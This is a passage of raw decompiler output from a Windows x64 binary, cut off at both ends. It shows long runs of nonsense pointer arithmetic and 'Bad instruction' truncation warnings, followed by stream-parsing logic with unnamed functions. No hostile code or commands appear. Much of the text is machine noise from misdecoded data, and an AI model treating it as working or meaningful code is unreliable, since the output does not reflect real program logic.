*piVar27 = *piVar27 + uVar7;\n                *piVar27 = *piVar27 + uVar7;\n                *piVar27 = *piVar27 + uVar7;\n                *piVar27 = *piVar27 + uVar7;\n                *piVar27 = *piVar27 + uVar7;\n                *piVar27 = *piVar27 + uVar7;\n                *piVar27 = *piVar27 + uVar7;\n                puVar1 = piVar27 + -0x73;\n                uVar8 = *puVar1;\n                *puVar1 = *puVar1 - 0x15;\n                *(piVar27 + 1) = *(piVar27 + 1) + uVar7 + (0x14 < uVar8);\n                *piVar27 = *piVar27 + uVar7;\n                uVar8 = *piVar27;\n                *piVar27 = *piVar27 + uVar7;\n                if (SCARRY1(uVar8, uVar7)) {\n                    *piVar27 = *piVar27 + piVar27;\n                    *piVar27 = *piVar27 + uVar7;\n                    *piVar27 = *piVar27 + uVar7;\n                    *piVar27 = *piVar27 + uVar7;\n                    uVar8 = *piVar27;\n                    piVar27 = piVar21 & 0xffffffffffffff00 | uVar7 + uVar8;\n                    *piVar27 = *piVar27 + uVar7 + uVar8;\n                    puVar36[0x10] = puVar36[0x10] & uVar6;\n                }\n                *piVar27 = *piVar27 + piVar27;\n                *piVar27 = *piVar27 + piVar27;\n                uVar7 = piVar27 + *piVar27;\n                uVar33 = piVar27 & 0xffffffffffffff00;\n                piVar21 = uVar33 | uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                uVar8 = *piVar21;\n                *piVar21 = *piVar21 + uVar7;\n                *(piVar21 + 0x5003fae6) = *(piVar21 + 0x5003fae6) << 1 | CARRY1(uVar8, uVar7);\n                *piVar21 = *piVar21 + uVar7;\n                *0x1400feb58 = *0x1400feb58 + uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                *piVar21 = *piVar21 + uVar7;\n                puVar1 = piVar21 + -0x73;\n                uVar8 = *puVar1;\n                *puVar1 = *puVar1 - 0x15;\n                *(piVar21 + 1) = *(piVar21 + 1) + uVar7 + (0x14 < uVar8);\n                *piVar21 = *piVar21 + uVar7;\n                uVar8 = *piVar21;\n                cVar5 = uVar33 >> 8;\n                *piVar21 = *piVar21 + cVar5;\n                if (SCARRY1(uVar8, cVar5)) {\n                    *piVar21 = *piVar21 + piVar21;\n                    *piVar21 = *piVar21 + uVar7;\n                    *piVar21 = *piVar21 + uVar7;\n                    *piVar21 = *piVar21 + uVar7;\n                    uVar8 = *piVar21;\n                    piVar21 = uVar33 | uVar7 + uVar8;\n                    *piVar21 = *piVar21 + uVar7 + uVar8;\n                    puVar36[0x10] = puVar36[0x10] & uVar6;\n                }\n                *piVar21 = *piVar21 + piVar21;\n                *piVar21 = *piVar21 + piVar21;\n                uVar6 = piVar21 + *piVar21;\n                piVar27 = piVar21 & 0xffffffffffffff00 | uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                uVar8 = *piVar27;\n                *piVar27 = *piVar27 + uVar6;\n                *(piVar27 + 0x5003fae6) = *(piVar27 + 0x5003fae6) << 1 | CARRY1(uVar8, uVar6);\n                *piVar27 = *piVar27 + uVar6;\n                *0x1400feb58 = *0x1400feb58 + uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + 0x58;\n                *piVar27 = *piVar27 + piVar27;\n                uVar8 = *piVar27;\n                *piVar27 = *piVar27 + uVar6;\n                if (SCARRY1(uVar8, uVar6)) {\n                    *piVar27 = *piVar27 + piVar27;\n                    uVar8 = *piVar27;\n                    *piVar27 = *piVar27 + uVar6;\n                    piVar27 = CONCAT71((piVar21 & 0xffffffffffffff00) >> 8, 0x51);\n                    *(piVar27 + 1) = *(piVar27 + 1) + 0x51 + CARRY1(uVar8, uVar6);\n                    *piVar27 = *piVar27 + 0x51;\n                    *piVar27 = *piVar27 + 0x51;\n                    *piVar27 = *piVar27 + 0x51;\n                }\n                cVar5 = piVar27;\n                *piVar27 = *piVar27 + cVar5;\n                *piVar27 = *piVar27 + cVar5;\n                *piVar27 = *piVar27 + uVar6;\n                *piVar27 = *piVar27 + piVar27;\n                *piVar27 = *piVar27 + cVar5;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *piVar21 = *piVar21 + uVar13;\n            *piVar21 = *piVar21 + cVar5;\n            uVar7 = cVar5 + *piVar21;\n            piVar21 = piVar21 & 0xffffffffffffff00 | uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            uVar8 = *piVar21;\n            *piVar21 = *piVar21 + uVar7;\n            puVar36[0x10] = puVar36[0x10] + uVar6 + CARRY1(uVar8, uVar7);\n            *piVar21 = *piVar21 + piVar21;\n            *piVar21 = *piVar21 + uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            *piVar21 = *piVar21 + uVar7;\n            *(piVar21 + 0x5003fb26) = *(piVar21 + 0x5003fb26);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe4:\ncode_r0x0001400febc0:\n            if (ppauVar30 == 0x1) {\n                return;\n            }\ncode_r0x0001400feb58:\n            do {\n                LOCK();\n            } while( true );\n        case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe9:\n            pcVar4 = swi(0x46);\n            iVar9 = (*pcVar4)();\n            uVar10 = SUB82(pcVar32, 0);\n            uVar12 = iVar9 / cVar34 & 0xffU | iVar9 % cVar34 << 8;\n            cVar5 = puVar36;\n            if (bVar38) {\n                uVar12 = uVar12 / cVar34 & 0xffU | uVar12 % cVar34 << 8;\n                if (ppauVar29 == 0x1) {\n                    uVar12 = uVar12 / cVar34 & 0xffU | uVar12 % cVar34 << 8;\n                    uVar12 = uVar12 / cVar34 & 0xffU | uVar12 % cVar34 << 8;\n                }\n                else {\n                    uVar12 = uVar12 % cVar34 << 8 | *(uVar33 + (uVar12 / cVar34 & 0xff));\n                    uVar12 = uVar12 / cVar5 & 0xffU | uVar12 % cVar5 << 8;\n                }\n                out(*arg1_00, uVar10);\n                *0xb2fff634e2fff641 = uVar12 / cVar5;\n                arg1_00 = arg1_00 + 4;\n            }\n            else {\n                uVar10 = SUB82(CONCAT71(pcVar32 >> 8, 0x40), 0);\n                *0xb2fff634e2fff641 = (uVar12 / cVar34 & 0xffU | uVar12 % cVar34 << 8) / cVar34;\n            }\n            uVar2 = in(uVar10);\n            *puVar36 = uVar2;\n            if (bVar38) {\n    // WARNING: Could not recover jumptable at 0x0001400fec6b. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppauVar16 = (**(arg1_00 + -0x1d0009bd))();\n                return ppauVar16;\n            }\ncode_r0x0001400fec2a:\n            *0x174f2ec28 = *0x174f2ec28 + cVar34 + cVar41;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xec:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf2:\n        case 0xf7:\n        case 0xf8:\n            piVar21 = uVar13 >> 10;\n            *arg3 = *arg3 + piVar21;\n        case 0xf9:\n            *piVar21 = *piVar21 + piVar21;\n            ppauStackY576 = 0x1400043b6;\n            fcn.140018d40(ppauVar16 + -10, 0x1400feb58, arg3, pauVar40);\n            return 0;\n        case 0xf3:\n        case 0xfa:\n            *piVar21 = *piVar21 + cVar5;\n            puVar35 = &stack0xfffffffffffffdc8;\n            goto code_r0x000140004460;\n        case 0xf4:\n        case 0xf6:\n            *(ppauVar29 + 0x3dc85) = *(ppauVar29 + 0x3dc85) + -1;\n            *(uVar33 + 0x3dcbd) = *(uVar33 + 0x3dcbd) + cVar5;\n            *piVar21 = *piVar21 + cVar5;\n            goto code_r0x000140004460;\n        case 0xf5:\n            cVar34 = *piVar21;\n            pcVar15 = piVar21 & 0xffffffffffffff00 | cVar5 + cVar34;\n            pcVar15[-0x77] = pcVar15[-0x77] + uVar6;\n            puVar1 = arg3 + -0x77;\n            *puVar1 = *puVar1 >> 1 | *puVar1 << 7;\n            puVar35 = &stack0xfffffffffffffdc0;\n            *pcVar15 = *pcVar15 + cVar5 + cVar34;\n            *(ppauVar16 + -0x21) = pcVar15;\n            ppauStackY576 = ppauVar16;\n            fcn.140018e30(ppauVar16 + -10, 0x1400feb58, arg3, pauVar40);\n            uStackY544 = 0;\n            pauVar40 = NULL;\n            arg3 = NULL;\n            uVar47 = fcn.140001c95(ppauVar16[0x78], ppauVar16[10], 0, 0);\n            *(ppauVar16 + 0x3dc) = uVar47;\ncode_r0x000140004460:\n            if (*(ppauVar16 + 0x3dc) == 0) {\n                *(puVar35 + -8) = 0x14000450d;\n                fcn.1400037f0(ppauVar16 + 0x5a, ppauVar16 + 0x2cf);\n                ppauVar16[-10] = ppauVar16[0x5a];\n                ppauVar16[-9] = ppauVar16[0x5b];\n                ppauVar16[-8] = ppauVar16[0x5c];\n                ppauVar16[-7] = ppauVar16[0x5d];\n                ppauVar16[-6] = ppauVar16[0x5e];\n                ppauVar16[-5] = ppauVar16[0x5f];\n                uVar24 = *(ppauVar16 + 0x305);\n                *(ppauVar16 + -0x23) = *(ppauVar16 + 0x2fd);\n                *(ppauVar16 + -0x1b) = uVar24;\n                *(puVar35 + -8) = 0x140004571;\n                fcn.140019000(ppauVar16 + -10, uVar24, arg3, pauVar40);\n                pauVar31 = ppauVar16[0x78];\n                *(puVar35 + -8) = 0x140004585;\n                uVar47 = fcn.140001cd6(pauVar31, 0, arg3, pauVar40);\n                *(ppauVar16 + 0x3dc) = uVar47;\n                if (*(ppauVar16 + 0x3dc) == 0) {\n                    *(puVar35 + -8) = 0x14000461e;\n                    fcn.140003b6c(ppauVar16 + 0x68, ppauVar16 + 0x33f);\n                    ppauVar16[-10] = ppauVar16[0x68];\n                    ppauVar16[-9] = ppauVar16[0x69];\n                    ppauVar16[-8] = ppauVar16[0x6a];\n                    ppauVar16[-7] = ppauVar16[0x6b];\n                    pauVar31 = ppauVar16[0x6d];\n                    ppauVar16[-6] = ppauVar16[0x6c];\n                    ppauVar16[-5] = pauVar31;\n                    *(ppauVar16 + -4) = *(ppauVar16 + 0x6e);\n                    *(puVar35 + -8) = 0x140004676;\n                    fcn.140018c60(ppauVar16 + -10, pauVar31, arg3, pauVar40);\n                    pauVar3 = ppauVar16[0x79];\n                    *(puVar35 + -8) = 0x140004685;\n                    fcn.140001b50(pauVar3, pauVar31, arg3, pauVar40);\n                    pauVar3 = ppauVar16[0x78];\n                    *(puVar35 + -8) = 0x140004694;\n                    fcn.140001b50(pauVar3, pauVar31, arg3, pauVar40);\n                }\n                else {\n                    *(puVar35 + -8) = 0x1400045aa;\n                    fcn.1400039ea(ppauVar16 + 0x62, ppauVar16 + 0x30f);\n                    ppauVar16[-10] = ppauVar16[0x62];\n                    ppauVar16[-9] = ppauVar16[99];\n                    ppauVar16[-8] = ppauVar16[100];\n                    ppauVar16[-7] = ppauVar16[0x65];\n                    *(ppauVar16 + -0x32) = *(ppauVar16 + 0x32e);\n                    *(ppauVar16 + -0x2a) = *(ppauVar16 + 0x336);\n                    uVar47 = *(ppauVar16 + 0x3dc);\n                    *(puVar35 + -8) = 0x1400045fe;\n                    fcn.140018b70(ppauVar16 + -10, uVar47, arg3, pauVar40);\n                }\n            }\n            else {\n                *(puVar35 + -8) = 0x140004483;\n                fcn.140003616(ppauVar16 + 0x52, ppauVar16 + 0x28f);\n                ppauVar16[-10] = ppauVar16[0x52];\n                ppauVar16[-9] = ppauVar16[0x53];\n                ppauVar16[-8] = ppauVar16[0x54];\n                ppauVar16[-7] = ppauVar16[0x55];\n                ppauVar16[-6] = ppauVar16[0x56];\n                ppauVar16[-5] = ppauVar16[0x57];\n                *(ppauVar16 + -0x27) = *(ppauVar16 + 0x2b9);\n                *(ppauVar16 + -0x1f) = *(ppauVar16 + 0x2c1);\n                uVar47 = *(ppauVar16 + 0x3dc);\n                *(puVar35 + -8) = 0x1400044ed;\n                fcn.140018f10(ppauVar16 + -10, uVar47, arg3, pauVar40);\n            }\n            return NULL;\n        case 0xfb:\n            ppauStackY576 = 0x14000472f;\n            ppauVar16 = fcn.1400046c0(1, 0x1400feb58);\n            return ppauVar16;\n        case 0xfc:\n        case 0xfd:\n        case 0xfe:\n            *piVar21 = *piVar21 + uVar13;\n            *piVar21 = *piVar21 + cVar5;\n            return 0;\n        case 0xff:\n            *(puVar36 + 0x68) = *(puVar36 + 0x68) ^ arg1_00;\n            return NULL;\n        }\ncode_r0x000140062058:\n        piVar37 = CONCAT44(uStack404, uStack408);\ncode_r0x000140061d4d:\n        puVar36 = puVar36 + 1;\n        unaff_RSI = arg1_00;\n        in_R9 = auStack424;\n    } while( true );\ncode_r0x0001400683c9:\n    if (piVar37[2] < piVar37[3]) {\n        piVar37[2] = piVar37[2] + 2;\n    }\n    else {\n        ppauStackY576 = 0x14006883e;\n        (**(*piVar37 + 0x50))(piVar37);\n    }\n    _auStack424 = CONCAT28(0xffff, auStack424);\n    bVar38 = true;\n    if (piVar37 != NULL) {\n        if (piVar37[2] < piVar37[3]) {\n            iVar9 = *piVar37[2];\n        }\n        else {\n            ppauStackY576 = 0x140068b3e;\n            iVar9 = (**(*piVar37 + 0x48))(piVar37);\n        }\n        if (iVar9 == -1) {\n            _auStack424 = _auStack424 & 0xffffffffffffffff;\n        }\n        bVar38 = iVar9 == -1;\n    }\n    bVar42 = iStack432 == -1;\n    piVar37 = SUB168(auStack440_00, 0);\n    if ((piVar37 != NULL) && (bVar42)) {\n        if (piVar37[2] < piVar37[3]) {\n            iVar9 = *piVar37[2];\n        }\n        else {\n            ppauStackY576 = 0x140068b49;\n            iVar9 = (**(*piVar37 + 0x48))();\n        }\n        if (iVar9 == -1) {\n            auStack440_00 = auStack440_00 & 0xffffffffffffffff;\n        }\n        bVar42 = iVar9 == -1;\n    }\n    if (bVar42 == bVar38) goto code_r0x000140067dbc;\n    if (auStack424 != NULL) {\n        if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n            iVar9 = **(auStack424 + 0x10);\n        }\n        else {\n            ppauStackY576 = 0x140068b54;\n            iVar9 = (**(*auStack424 + 0x48))();\n        }\n        if (iVar9 == -1) {\n            _auStack424 = _auStack424 & 0xffffffffffffffff;\n        }\n    }\n    ppauStackY576 = 0x1400683b9;\n    cVar5 = (**(**pauVar31 + 0x10))();\n    if (cVar5 == '\\0') goto code_r0x000140067dbc;\n    piVar37 = auStack424;\n    goto code_r0x0001400683c9;\ncode_r0x000140067dbc:\n    while( true ) {\n        iVar14 = in_stack_fffffffffffffe08;\n        in_stack_fffffffffffffe08 = in_stack_fffffffffffffe08 + 1;\n        uVar8 = in_stack_fffffffffffffdf8 >> 0x20;\n        if ((uVar8 & iVar14 + 1 < 4) == 0) break;\ncode_r0x000140067d62:\n        if (puVar17[in_stack_fffffffffffffe08] < 5) {\n    // WARNING: Could not recover jumptable at 0x000140067d88. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppauVar16 = (*(*(puVar17[in_stack_fffffffffffffe08] * 4 + 0x1400fecc0) + 0x1400fecc0))();\n            return ppauVar16;\n        }\n        in_stack_fffffffffffffdf8 = 0x100000000;\n    }\n    if ((0x1 < noname_10 & uVar8) == 0) {\n        if (uVar8 != 0) {\n            uVar20 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\njoined_r0x000140068ab0:\n            if (1 < uVar20) {\n                ppauStackY576 = 0x140068892;\n                uVar20 = fcn.14001ef10(arg1_00, 0x30, 0);\n                if (uVar20 != 0) {\n                    uVar39 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n                    if (uVar20 == 0xffffffffffffffff) {\n                        uVar20 = uVar39 - 1;\n                    }\n                    if (uVar20 <= uVar39) {\n                        uVar39 = uVar20;\n                    }\n                    ppauStackY576 = 0x1400688c7;\n                    fcn.140077920(arg1_00, 0, uVar39, 0);\n                }\n            }\n            if (SUB161(in_stack_fffffffffffffe38 >> 0x70, 0) != '\\0') {\n                pcVar15 = CONCAT44(uStack380, CONCAT22(uStack382, uStack384));\n                if (-1 < *(pcVar15 + -8)) {\n                    ppauStackY576 = 0x140068b99;\n                    fcn.1400758a0(arg1_00);\n                    pcVar15 = CONCAT44(uStack380, CONCAT22(uStack382, uStack384));\n                }\n                if (*pcVar15 != '0') {\n                    if (-1 < *(pcVar15 + -8)) {\n                        ppauStackY576 = 0x140068b8c;\n                        fcn.1400758a0(arg1_00);\n                    }\n                    ppauStackY576 = 0x140068afd;\n                    fcn.140075d80(arg1_00, 0, 0, 1);\n                    *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -8) = 0xffffffff;\n                }\n            }\n            if (*(CONCAT44(uStack388, uStack392) + -0x18) != 0) {\n                cVar5 = uVar33;\n                if (SUB161(in_stack_fffffffffffffe38 >> 0x68, 0) != '\\0') {\n                    cVar5 = SUB161(in_stack_fffffffffffffe38 >> 0x40, 0);\n                }\n                ppauStackY576 = 0x14006872b;\n                fcn.140077ac0(&stack0xfffffffffffffe78, cVar5);\n                ppauStackY576 = 0x14006873b;\n                cVar5 = fcn.1400b15c0(*(iVar19 + 0x10), *(iVar19 + 0x18), &stack0xfffffffffffffe78);\n                if (cVar5 == '\\0') {\n                    *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 4;\n                }\n            }\n            if ((SUB161(in_stack_fffffffffffffe38 >> 0x68, 0) == '\\0') || (*(iVar19 + 0x58) == uVar33)) {\n                ppauStackY576 = 0x14006876b;\n                fcn.1400762a0(CONCAT44(uStack244, uStack248), arg1_00);\n                goto code_r0x00014006824e;\n            }\n        }\n    }\n    else {\n        if (SUB161(in_stack_fffffffffffffe38 >> 0x70, 0) == '\\0') {\n            iVar22 = *(iVar19 + 0x38);\n        }\n        else {\n            iVar22 = *(iVar19 + 0x48);\n        }\n        puVar17 = 0x1;\n        piVar37 = auStack424;\n        while( true ) {\n            bVar42 = uStack416 == -1;\n            bVar38 = bVar42;\n            if ((piVar37 != NULL) && (bVar42)) {\n                if (piVar37[2] < piVar37[3]) {\n                    iVar9 = *piVar37[2];\n                }\n                else {\n                    ppauStackY576 = 0x140068b2f;\n                    iVar9 = (**(*piVar37 + 0x48))(piVar37);\n                }\n                if (iVar9 == -1) {\n                    _auStack424 = _auStack424 & 0xffffffffffffffff;\n                }\n                bVar38 = iVar9 == -1;\n            }\n            bVar43 = iStack432 == -1;\n            piVar37 = SUB168(auStack440_00, 0);\n            if ((piVar37 != NULL) && (bVar43)) break;\n            if (noname_10 <= puVar17) goto code_r0x0001400686d0;\ncode_r0x000140067f04:\n            if (bVar43 == bVar38) goto code_r0x0001400686d0;\n            if ((auStack424 != NULL) && (bVar42)) {\n                if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                    uStack416._0_2_ = **(auStack424 + 0x10);\n                }\n                else {\n                    ppauStackY576 = 0x140068b62;\n                    uStack416._0_2_ = (**(*auStack424 + 0x48))();\n                }\n                if (uStack416 == -1) {\n                    _auStack424 = _auStack424 & 0xffffffffffffffff;\n                }\n            }\n            if (*(iVar22 + puVar17 * 2) != uStack416) goto code_r0x000140068243;\n            piVar37 = auStack424;\n            if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                *(auStack424 + 0x10) = *(auStack424 + 0x10) + 2;\n            }\n            else {\n                ppauStackY576 = 0x14006884c;\n                (**(*auStack424 + 0x50))(auStack424);\n            }\n            puVar17 = puVar17 + 1;\n            uStack416._0_2_ = -1;\n            _auStack424 = CONCAT28(0xffff, auStack424);\n        }\n        if (piVar37[2] < piVar37[3]) {\n            iVar9 = *piVar37[2];\n        }\n        else {\n            ppauStackY576 = 0x140068b21;\n            iVar9 = (**(*piVar37 + 0x48))();\n        }\n        if (iVar9 == -1) {\n            auStack440_00 = auStack440_00 & 0xffffffffffffffff;\n        }\n        bVar43 = iVar9 == -1;\n        if (puVar17 < noname_10) goto code_r0x000140067f04;\ncode_r0x0001400686d0:\n        if (puVar17 == noname_10) {\n            uVar20 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n            goto joined_r0x000140068ab0;\n        }\n    }\ncode_r0x000140068243:\n    *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 4;\ncode_r0x00014006824e:\n    ppauStackY576 = 0x140068263;\n    cVar5 = fcn.140024020(&stack0xfffffffffffffe58, &stack0xfffffffffffffe48);\n    if (cVar5 != '\\0') {\n        *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 2;\n    }\n    *ppauStack296 = auStack424._0_4_;\n    *(ppauStack296 + 4) = auStack424._4_4_;\n    *(ppauStack296 + 1) = uStack416;\n    *(ppauStack296 + 0xc) = uStack416._4_4_;\n    ppauStackY576 = 0x14006829c;\n    fcn.140075fa0(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n    ppauStackY576 = 0x1400682b0;\n    fcn.140075fa0(CONCAT44(uStack388, uStack392) + -0x18);\n    return ppauStack296;\ncode_r0x0001400693eb:\n    *0x1400feb58 = *0x1400feb58 << 1 | *0x1400feb58 >> 7;\n    piVar37 = in_stack_00000040 + iVar19;\n    uStackY552 = uVar13;\n    while( true ) {\n        _auStack424 = CONCAT28(0xffff, auStack424);\n        bVar38 = true;\n        if (piVar37 != NULL) {\n            if (piVar37[2] < piVar37[3]) {\n                iVar9 = *piVar37[2];\n            }\n            else {\n                ppauStackY576 = 0x140069b4e;\n                iVar9 = (**(*piVar37 + 0x48))(piVar37);\n            }\n            if (iVar9 == -1) {\n                _auStack424 = _auStack424 & 0xffffffffffffffff;\n            }\n            bVar38 = iVar9 == -1;\n        }\n        bVar42 = iStack432 == -1;\n        piVar37 = SUB168(auStack440_00, 0);\n        if ((piVar37 != NULL) && (bVar42)) {\n            if (piVar37[2] < piVar37[3]) {\n                iVar9 = *piVar37[2];\n            }\n            else {\n                ppauStackY576 = 0x140069b59;\n                iVar9 = (**(*piVar37 + 0x48))();\n            }\n            if (iVar9 == -1) {\n                auStack440_00 = auStack440_00 & 0xffffffffffffffff;\n            }\n            bVar42 = iVar9 == -1;\n        }\n        if (bVar42 == bVar38) break;\n        if (auStack424 != NULL) {\n            if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                iVar9 = **(auStack424 + 0x10);\n            }\n            else {\n                ppauStackY576 = 0x140069b64;\n                iVar9 = (**(*auStack424 + 0x48))();\n            }\n            if (iVar9 == -1) {\n                _auStack424 = _auStack424 & 0xffffffffffffffff;\n            }\n        }\n        ppauStackY576 = 0x1400693c9;\n        cVar5 = (**(**pauVar31 + 0x10))();\n        if (cVar5 == '\\0') break;\n        piVar37 = auStack424;\n        if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n            *(auStack424 + 0x10) = *(auStack424 + 0x10) + 2;\n        }\n        else {\n            ppauStackY576 = 0x14006984e;\n            (**(*auStack424 + 0x50))(auStack424);\n        }\n    }\n    while( true ) {\n        iVar14 = in_stack_fffffffffffffe08;\n        in_stack_fffffffffffffe08 = in_stack_fffffffffffffe08 + 1;\n        uVar8 = in_stack_fffffffffffffdf8 >> 0x20;\n        if ((uVar8 & iVar14 + 1 < 4) == 0) break;\ncode_r0x000140068d72:\n        if (puVar17[in_stack_fffffffffffffe08] < 5) {\n    // WARNING: Could not recover jumptable at 0x000140068d98. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppauVar16 = (*(*(puVar17[in_stack_fffffffffffffe08] * 4 + 0x1400fecac) + 0x1400fecac))();\n            return ppauVar16;\n        }\n        in_stack_fffffffffffffdf8 = 0x100000000;\n    }\n    if ((0x1 < noname_10 & uVar8) == 0) {\n        if (uVar8 != 0) {\n            uVar20 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\njoined_r0x000140069ac0:\n            if (1 < uVar20) {\n                ppauStackY576 = 0x1400698a2;\n                uVar20 = fcn.14001ef10(arg1_00, 0x30, 0);\n                if (uVar20 != 0) {\n                    uVar39 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n                    if (uVar20 == 0xffffffffffffffff) {\n                        uVar20 = uVar39 - 1;\n                    }\n                    if (uVar20 <= uVar39) {\n                        uVar39 = uVar20;\n                    }\n                    ppauStackY576 = 0x1400698d7;\n                    fcn.140077920(arg1_00, 0, uVar39, 0);\n                }\n            }\n            if (SUB161(in_stack_fffffffffffffe38 >> 0x70, 0) != '\\0') {\n                pcVar15 = CONCAT44(uStack380, CONCAT22(uStack382, uStack384));\n                if (-1 < *(pcVar15 + -8)) {\n                    ppauStackY576 = 0x140069ba9;\n                    fcn.1400758a0(arg1_00);\n                    pcVar15 = CONCAT44(uStack380, CONCAT22(uStack382, uStack384));\n                }\n                if (*pcVar15 != '0') {\n                    if (-1 < *(pcVar15 + -8)) {\n                        ppauStackY576 = 0x140069b9c;\n                        fcn.1400758a0(arg1_00);\n                    }\n                    ppauStackY576 = 0x140069b0d;\n                    fcn.140075d80(arg1_00, 0, 0, 1);\n                    *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -8) = 0xffffffff;\n                }\n            }\n            if (*(CONCAT44(uStack388, uStack392) + -0x18) != 0) {\n                cVar5 = uVar33;\n                if (SUB161(in_stack_fffffffffffffe38 >> 0x68, 0) != '\\0') {\n                    cVar5 = SUB161(in_stack_fffffffffffffe38 >> 0x40, 0);\n                }\n                ppauStackY576 = 0x14006973b;\n                fcn.140077ac0(&stack0xfffffffffffffe78, cVar5);\n                ppauStackY576 = 0x14006974b;\n                cVar5 = fcn.1400b15c0(*(iVar19 + 0x10), *(iVar19 + 0x18), &stack0xfffffffffffffe78);\n                if (cVar5 == '\\0') {\n                    *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 4;\n                }\n            }\n            if ((SUB161(in_stack_fffffffffffffe38 >> 0x68, 0) == '\\0') || (*(iVar19 + 0x58) == uVar33)) {\n                ppauStackY576 = 0x14006977b;\n                fcn.1400762a0(CONCAT44(uStack244, uStack248), arg1_00);\n                goto code_r0x00014006925e;\n            }\n        }\n    }\n    else {\n        if (SUB161(in_stack_fffffffffffffe38 >> 0x70, 0) == '\\0') {\n            iVar22 = *(iVar19 + 0x38);\n        }\n        else {\n            iVar22 = *(iVar19 + 0x48);\n        }\n        puVar17 = 0x1;\n        piVar37 = auStack424;\n        while( true ) {\n            bVar42 = uStack416 == -1;\n            bVar38 = bVar42;\n            if ((piVar37 != NULL) && (bVar42)) {\n                if (piVar37[2] < piVar37[3]) {\n                    iVar9 = *piVar37[2];\n                }\n                else {\n                    ppauStackY576 = 0x140069b3f;\n                    iVar9 = (**(*piVar37 + 0x48))(piVar37);\n                }\n                if (iVar9 == -1) {\n                    _auStack424 = _auStack424 & 0xffffffffffffffff;\n                }\n                bVar38 = iVar9 == -1;\n            }\n            bVar43 = iStack432 == -1;\n            piVar37 = SUB168(auStack440_00, 0);\n            if ((piVar37 != NULL) && (bVar43)) break;\n            if (noname_10 <= puVar17) goto code_r0x0001400696e0;\ncode_r0x000140068f14:\n            if (bVar43 == bVar38) goto code_r0x0001400696e0;\n            if ((auStack424 != NULL) && (bVar42)) {\n                if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                    uStack416._0_2_ = **(auStack424 + 0x10);\n                }\n                else {\n                    ppauStackY576 = 0x140069b72;\n                    uStack416._0_2_ = (**(*auStack424 + 0x48))();\n                }\n                if (uStack416 == -1) {\n                    _auStack424 = _auStack424 & 0xffffffffffffffff;\n                }\n            }\n            if (*(iVar22 + puVar17 * 2) != uStack416) goto code_r0x000140069253;\n            piVar37 = auStack424;\n            if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                *(auStack424 + 0x10) = *(auStack424 + 0x10) + 2;\n            }\n            else {\n                ppauStackY576 = 0x14006985c;\n                (**(*auStack424 + 0x50))(auStack424);\n            }\n            puVar17 = puVar17 + 1;\n            uStack416._0_2_ = -1;\n            _auStack424 = CONCAT28(0xffff, auStack424);\n        }\n        if (piVar37[2] < piVar37[3]) {\n            iVar9 = *piVar37[2];\n        }\n        else {\n            ppauStackY576 = 0x140069b31;\n            iVar9 = (**(*piVar37 + 0x48))();\n        }\n        if (iVar9 == -1) {\n            auStack440_00 = auStack440_00 & 0xffffffffffffffff;\n        }\n        bVar43 = iVar9 == -1;\n        if (puVar17 < noname_10) goto code_r0x000140068f14;\ncode_r0x0001400696e0:\n        if (puVar17 == noname_10) {\n            uVar20 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n            goto joined_r0x000140069ac0;\n        }\n    }\ncode_r0x000140069253:\n    *CONCAT44(uStack252, uStack256) = 